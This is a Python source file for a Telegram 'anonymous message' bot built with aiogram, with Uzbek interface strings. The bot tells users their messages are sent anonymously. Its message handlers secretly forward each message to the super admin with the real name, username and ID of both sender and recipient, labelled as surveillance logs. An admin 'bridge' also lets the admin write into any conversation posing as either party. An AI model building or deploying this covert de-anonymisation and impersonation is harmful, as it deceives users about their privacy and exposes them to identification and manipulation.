import asyncio
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.context import FSMContext

from config import BOT_TOKEN, SUPER_ADMIN_ID
from database import db
from states import BotStates
import keyboards as kb

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def check_admin(user_id):
    return user_id == SUPER_ADMIN_ID or user_id in db.get_admins()


# --- REKLAMANI FONDA TARQATISH ---
async def send_broadcast_task(message: Message, users: list, admin_id: int):
    send_count = 0
    fail_count = 0
    for u in users:
        try:
            await message.bot.copy_message(
                chat_id=u[0],
                from_chat_id=message.chat.id,
                message_id=message.message_id
            )
            send_count += 1
            await asyncio.sleep(0.05)
        except Exception:
            fail_count += 1

    try:
        await message.bot.send_message(
            admin_id,
            f"📢 **Reklama yakunlandi!**\n\n"
            f"✅ Muvaffaqiyatli yetkazildi: {send_count} ta\n"
            f"❌ Botni bloklaganlar: {fail_count} ta",
            parse_mode="Markdown"
        )
    except Exception:
        pass


# --- START KOMANDASI ---
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext, command: CommandObject):
    await state.clear()
    user_id = message.from_user.id
    full_name = message.from_user.full_name
    username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"

    user = db.get_user(user_id)
    bot_user = await bot.get_me()

    if not user:
        token = db.add_user(user_id, full_name, username)
        alert = f"🆕 **Yangi foydalanuvchi:** {full_name}\n🆔 ID: `{user_id}`"
        try:
            await bot.send_message(SUPER_ADMIN_ID, alert, parse_mode="Markdown")
        except Exception:
            pass
    else:
        token = user[1]

    target_token = command.args if command.args else None

    if target_token:
        owner = db.get_user_by_token(target_token)
        if not owner:
            await message.answer("❌ Havola xato.", reply_markup=kb.main_menu)
            return
        if owner[0] == user_id:
            await message.answer("⚠️ O'zingizga yoza olmaysiz.", reply_markup=kb.main_menu)
            return

        await state.update_data(owner_id=owner[0])
        await message.answer(f"👤 **{owner[2]}** ga anonim xabar yozyapsiz. Matnni yuboring:")
        await state.set_state(BotStates.write_anon_msg)
    else:
        await message.answer(
            f"👋 Salom, {full_name}!\n\n🔗 Shaxsiy anonim havolangiz:\n"
            f"https://t.me/{bot_user.username}?start={token}",
            reply_markup=kb.main_menu
        )


# --- ILK ANONIM XABAR ---
@dp.message(BotStates.write_anon_msg, F.text)
async def send_anonymous_text(message: Message, state: FSMContext):
    data = await state.get_data()
    owner_id = data.get("owner_id")
    sender_id = message.from_user.id

    chat_id = db.get_or_create_chat(owner_id, sender_id)
    db.save_message(chat_id, sender_id, message.text)

    # Foydalanuvchilar haqida ma'lumotlarni bazadan olish (Adminga to'liq chiqarish uchun)
    owner_info = db.get_user(owner_id)
    owner_name = owner_info[2] if owner_info else "Noma'lum"
    owner_user = owner_info[3] if owner_info else "Mavjud emas"

    sender_name = message.from_user.full_name
    sender_user = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"

    await bot.send_message(
        owner_id,
        f"📥 **Yangi anonim xabar oldingiz!**\n\n💬 {message.text}",
        reply_markup=kb.get_reply_button(chat_id, "anon"),
        parse_mode="Markdown"
    )

    # 🕵️‍♂️ ADMINGA BORADIGAN TO'LIQ LOG
    admin_log = (
        f"🕵️‍♂️ 📑 **[KUZATUV BOSHLANDI # {chat_id}]**\n\n"
        f"👤 **KIMDAN (Anonim):**\n"
        f" ├─ Ismi: {sender_name}\n"
        f" ├─ Username: {sender_user}\n"
        f" └─ ID: `{sender_id}`\n\n"
        f"➡️ **KIMGA (Havola Egasi):**\n"
        f" ├─ Ismi: {owner_name}\n"
        f" ├─ Username: {owner_user}\n"
        f" └─ ID: `{owner_id}`\n\n"
        f"💬 **Xabar matni:** {message.text}"
    )
    try:
        await bot.send_message(
            SUPER_ADMIN_ID, 
            admin_log, 
            reply_markup=kb.get_admin_bridge_buttons(chat_id),
            parse_mode="Markdown"
        )
    except Exception:
        pass

    await message.answer("✅ Xabaringiz anonim tarzda yuborildi!", reply_markup=kb.main_menu)
    await state.clear()


# --- FOYDALANUVCHILAR UCHUN UZLUKSIZ INLINE JAVOB ---
@dp.callback_query(F.data.startswith("rep_"))
async def handle_reply_callback(call: CallbackQuery, state: FSMContext):
    await state.clear()
    _, chat_id, target_role = call.data.split("_")
    chat_id = int(chat_id)

    await state.update_data(chat_id=chat_id, target_role=target_role)
    await call.message.answer("✍ *Javobingizni yozing:*", parse_mode="Markdown")
    await state.set_state(BotStates.reply_msg)
    await call.answer()


@dp.message(BotStates.reply_msg, F.text)
async def process_continuous_reply(message: Message, state: FSMContext):
    if check_admin(message.from_user.id):
        current_data = await state.get_data()
        if "target_role" not in current_data:
            await state.clear()
            return

    data = await state.get_data()
    chat_id = data.get("chat_id")
    target_role = data.get("target_role")

    chat = db.get_chat_by_id(chat_id)
    if not chat: 
        await message.answer("❌ Suhbat topilmadi.")
        await state.clear()
        return

    receiver_id, sender_id = chat

    if target_role == "anon":
        destination = sender_id
        from_id = receiver_id
        to_id = sender_id
        prefix = "↩️ **Havola egasidan javob keldi:**"
        next_role = "owner"
        role_label = "HAVOLA EGASI"
    else:
        destination = receiver_id
        from_id = sender_id
        to_id = receiver_id
        prefix = "📥 **Anonim suhbatdoshingizdan yangi xabar:**"
        next_role = "anon"
        role_label = "ANONIM"

    db.save_message(chat_id, message.from_user.id, message.text)

    try:
        await bot.send_message(
            destination,
            f"{prefix}\n\n💬 {message.text}",
            reply_markup=kb.get_reply_button(chat_id, next_role),
            parse_mode="Markdown"
        )
        await message.answer("✅ Xabaringiz yetkazildi.", reply_markup=kb.main_menu)
    except Exception:
        await message.answer("❌ Xabarni yetkazishda xatolik yuz berdi.")

    # Bazadan ma'lumotlarni to'liq olib adminga ko'rsatish
    f_user = db.get_user(from_id)
    f_name = f_user[2] if f_user else message.from_user.full_name
    f_username = f_user[3] if f_user else (f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas")

    t_user = db.get_user(to_id)
    t_name = t_user[2] if t_user else "Noma'lum"
    t_username = t_user[3] if t_user else "Mavjud emas"

    # 🕵️‍♂️ INLINE TUGMA ORQALI JAVOB BERILGANDA ADMINGA BORADIGAN LOG
    admin_log = (
        f"🕵️‍♂️ 📑 **[YANGI KUZATUV XABARI # {chat_id}]**\n\n"
        f"✍️ **Yozuvchi (Xabar yuborgan):**\n"
        f" ├─ Rol: {role_label}\n"
        f" ├─ Ismi: {f_name}\n"
        f" ├─ Username: {f_username}\n"
        f" └─ ID: `{from_id}`\n\n"
        f"🎯 **Qabul qiluvchi (Xabar borayotgan shaxs):**\n"
        f" ├─ Ismi: {t_name}\n"
        f" ├─ Username: {t_username}\n"
        f" └─ ID: `{to_id}`\n\n"
        f"💬 **Xabar matni:** {message.text}"
    )
    try:
        await bot.send_message(
            SUPER_ADMIN_ID, 
            admin_log, 
            reply_markup=kb.get_admin_bridge_buttons(chat_id),
            parse_mode="Markdown"
        )
    except Exception:
        pass
    
    await state.clear()


# --- ADMIN: ORAGA QO'SHILISH (BRIDGE) ---
@dp.callback_query(F.data.startswith("abr_"))
async def handle_admin_bridge(call: CallbackQuery, state: FSMContext):
    if not check_admin(call.from_user.id): return
    await state.clear()
    _, chat_id, pretend_role = call.data.split("_")
    chat_id = int(chat_id)

    await state.update_data(bridge_chat_id=chat_id, pretend_role=pretend_role)

    if pretend_role == "anon":
        await call.message.answer(f"🎭 **Suhbat #{chat_id}: [Anonim] nomidan** Havola Egasiga xabar yozing:")
    else:
        await call.message.answer(f"👤 **Suhbat #{chat_id}: [Havola Egasi] nomidan** Anonimga xabar yozing:")

    await state.set_state(BotStates.admin_bridge_reply)
    await call.answer()


@dp.message(BotStates.admin_bridge_reply, F.text)
async def process_admin_bridge_reply(message: Message, state: FSMContext):
    if not check_admin(message.from_user.id): return
    data = await state.get_data()
    chat_id = data.get("bridge_chat_id")
    pretend_role = data.get("pretend_role")

    chat = db.get_chat_by_id(chat_id)
    if not chat:
        await message.answer("❌ Ushbu suhbat faol emas.")
        await state.clear()
        return

    receiver_id, sender_id = chat

    if pretend_role == "anon":
        destination = receiver_id
        prefix = "📥 **Anonim suhbatdoshingizdan yangi xabar:**"
        next_role = "anon"
        db.save_message(chat_id, sender_id, f"[ADMIN AS ANON]: {message.text}")
    else:
        destination = sender_id
        prefix = "↩️ **Havola egasidan javob keldi:**"
        next_role = "owner"
        db.save_message(chat_id, receiver_id, f"[ADMIN AS OWNER]: {message.text}")

    try:
        await bot.send_message(
            destination,
            f"{prefix}\n\n💬 {message.text}",
            reply_markup=kb.get_reply_button(chat_id, next_role),
            parse_mode="Markdown"
        )
        await message.answer(f"🚀 Xabar muvaffaqiyatli tarzda '{pretend_role}' nomidan yetkazildi!",
                             reply_markup=kb.admin_menu)
    except Exception:
        await message.answer("❌ Xabarni yuborishda xatolik yuz berdi.")

    await state.clear()


# --- FOYDALANUVCHI MENYUSI ---
@dp.message(F.text == "🔗 Mening Havolam")
async def show_my_link(message: Message):
    user = db.get_user(message.from_user.id)
    bot_user = await bot.get_me()
    if user:
        await message.answer(f"🔗 **Sizning shaxsiy havolangiz:**\n\nhttps://t.me/{bot_user.username}?start={user[1]}",
                             reply_markup=kb.main_menu)


# --- COMMAND ADMIN PANEL OCHISH ---
@dp.message(Command("admin"))
async def open_admin(message: Message):
    if check_admin(message.from_user.id):
        await message.answer("👨‍💻 Admin panel ochildi:", reply_markup=kb.admin_menu)


# --- ADMIN PANEL BARCHA INTEGRATSIYALARI ---
@dp.message(F.text == "🏠 Oddiy rejim")
async def close_admin(message: Message):
    if check_admin(message.from_user.id):
        await message.answer("Oddiy rejimga qaytdingiz.", reply_markup=kb.main_menu)


@dp.message(F.text == "📊 Statistika")
async def view_stats(message: Message):
    if check_admin(message.from_user.id):
        await message.answer(f"📊 **Jami ro'yxatdan o'tgan foydalanuvchilar:** {len(db.get_all_users())} ta",
                             reply_markup=kb.admin_menu)


@dp.message(F.text == "👥 Ro'yxatni ko'rish")
async def view_users(message: Message):
    if not check_admin(message.from_user.id): return
    text = "👥 **Foydalanuvchilar Ro'yxati:**\n\n"
    for u in db.get_all_users():
        text += f"👤 {u[2]} | ID: `{u[0]}`\n"
    await message.answer(text[:4000], parse_mode="Markdown", reply_markup=kb.admin_menu)


@dp.message(F.text == "➕ Admin Qo'shish")
async def add_admin_state(message: Message, state: FSMContext):
    if check_admin(message.from_user.id):
        await message.answer("➕ Yangi admin Telegram ID-sini kiriting:")
        await state.set_state(BotStates.add_admin)


@dp.message(BotStates.add_admin, F.text)
async def add_admin_finish(message: Message, state: FSMContext):
    try:
        db.add_admin(int(message.text))
        await message.answer("✅ Yangi admin muvaffaqiyatli qo'shildi.", reply_markup=kb.admin_menu)
    except Exception:
        await message.answer("❌ Xatolik! ID raqam bo'lishi kerak.", reply_markup=kb.admin_menu)
    await state.clear()


@dp.message(F.text == "➖ Admin O'chirish")
async def del_admin_state(message: Message, state: FSMContext):
    if check_admin(message.from_user.id):
        await message.answer("➖ O'chiriladigan admin Telegram ID-sini kiriting:")
        await state.set_state(BotStates.del_admin)


@dp.message(BotStates.del_admin, F.text)
async def del_admin_finish(message: Message, state: FSMContext):
    try:
        del_id = int(message.text)
        if del_id == SUPER_ADMIN_ID:
            await message.answer("🛑 Asosiy tizm adminini o'chirib bo'lmaydi!", reply_markup=kb.admin_menu)
        else:
            db.del_admin(del_id)
            await message.answer("✅ Admin muvaffaqiyatli o'chirildi.", reply_markup=kb.admin_menu)
    except Exception:
        await message.answer("❌ Xatolik!", reply_markup=kb.admin_menu)
    await state.clear()


@dp.message(F.text == "📢 Reklama tarqatish")
async def start_broadcast(message: Message, state: FSMContext):
    if check_admin(message.from_user.id):
        await message.answer(
            "📢 **Barcha foydalanuvchilarga yuboriladigan reklama matnini (yoki rasmini) kiriting:**",
            parse_mode="Markdown")
        await state.set_state(BotStates.admin_broadcast)


@dp.message(BotStates.admin_broadcast)
async def send_broadcast(message: Message, state: FSMContext):
    if not check_admin(message.from_user.id): return
    users = db.get_all_users()
    await message.answer("🚀 **Reklama tarqatish orqa fonda boshlandi!**", reply_markup=kb.admin_menu)
    await state.clear()
    asyncio.create_task(send_broadcast_task(message, users, message.from_user.id))


@dp.callback_query(F.data == "copy_link")
async def process_copy_link(call: CallbackQuery):
    user = db.get_user(call.from_user.id)
    bot_user = await bot.get_me()
    token = user[1] if user else "xato"
    share_link = f"https://t.me/{bot_user.username}?start={token}"
    await call.message.answer(f"📋 **Sizning shaxsiy havolangiz:**\n\n`{share_link}`", parse_mode="Markdown")
    await call.answer()


# --- TO'G'RIDAN TO'G'RI CHATGA YOZILGANDA (BOSHIDAGI MANTIQ) ---
@dp.message(F.text, ~F.text.startswith("/"))
async def handle_unknown_messages(message: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is not None:
        return

    user_id = message.from_user.id
    active_chats = []
    if hasattr(db, 'get_all_chats'):
        active_chats = db.get_all_chats()
    elif hasattr(db, 'get_chats'):
        active_chats = db.get_chats()

    found_chat_id, destination_id, target_role = None, None, "anon"
    for c in active_chats:
        if len(c) >= 3:
            if c[1] == user_id:
                found_chat_id, destination_id, target_role = c[0], c[2], "owner"
                break
            elif c[2] == user_id:
                found_chat_id, destination_id, target_role = c[0], c[1], "anon"
                break

    if found_chat_id and destination_id:
        db.save_message(found_chat_id, user_id, message.text)
        prefix = "↩️ **Havola egasidan javob keldi:**" if target_role == "owner" else "📥 **Anonim suhbatdoshingizdan yangi xabar:**"
        next_role = "owner" if target_role == "owner" else "anon"
        
        try:
            await bot.send_message(
                destination_id, 
                f"{prefix}\n\n💬 {message.text}", 
                reply_markup=kb.get_reply_button(found_chat_id, next_role), 
                parse_mode="Markdown"
            )
            await message.answer("✅ Xabaringiz yetkazildi.", reply_markup=kb.main_menu)
        except Exception:
            pass

        # Bazadan ikkala tomonning ma'lumotlarini olish
        sender_info = db.get_user(user_id)
        s_name = sender_info[2] if sender_info else message.from_user.full_name
        s_user = sender_info[3] if sender_info else "Mavjud emas"

        rcv_info = db.get_user(destination_id)
        rcv_name = rcv_info[2] if rcv_info else "Noma'lum"
        rcv_user = rcv_info[3] if rcv_info else "Mavjud emas"

        # 🕵️‍♂️ TO'G'RIDAN-TO'G'RI YOZILGANDA ADMINGA BORADIGAN LOG
        admin_log = (
            f"🕵️‍♂️ 📑 **[KUZATUV (To'g'ridan-to'g'ri) # {found_chat_id}]**\n\n"
            f"✍️ **Yozuvchi:**\n"
            f" ├─ Rol: {'HAVOLA EGASI' if target_role == 'owner' else 'ANONIM'}\n"
            f" ├─ Ismi: {s_name}\n"
            f" ├─ Username: {s_user}\n"
            f" └─ ID: `{user_id}`\n\n"
            f"🎯 **Qabul qiluvchi:**\n"
            f" ├─ Ismi: {rcv_name}\n"
            f" ├─ Username: {rcv_user}\n"
            f" └─ ID: `{destination_id}`\n\n"
            f"💬 **Xabar matni:** {message.text}"
        )
        try:
            await bot.send_message(
                SUPER_ADMIN_ID, 
                admin_log, 
                reply_markup=kb.get_admin_bridge_buttons(found_chat_id), 
                parse_mode="Markdown"
            )
        except Exception:
            pass
        return

    # Agar hech qanday suhbat topilmasa:
    user = db.get_user(user_id)
    bot_user = await bot.get_me()
    token = user[1] if user else "xato"
    share_link = f"https://t.me/{bot_user.username}?start={token}"

    explain_text = "⚠️ **Xabaringiz hech kimga yetkazilmadi.**\n\nSizga yozishlari uchun havolangizni tarqating:"
    share_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Do'stlarga ulashish", switch_inline_query=f"\n👉 {share_link}")],
        [InlineKeyboardButton(text="📋 Havolani nusxalash", callback_data="copy_link")]
    ])
    await message.answer(explain_text, reply_markup=share_keyboard, parse_mode="Markdown")


# --- WEB SERVER PORT ---
async def handle(request):
    return web.Response(text="Bot is running!")


async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000)))
    await site.start()


# --- MAIN ---
async def main():
    asyncio.create_task(start_web_server()) 
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
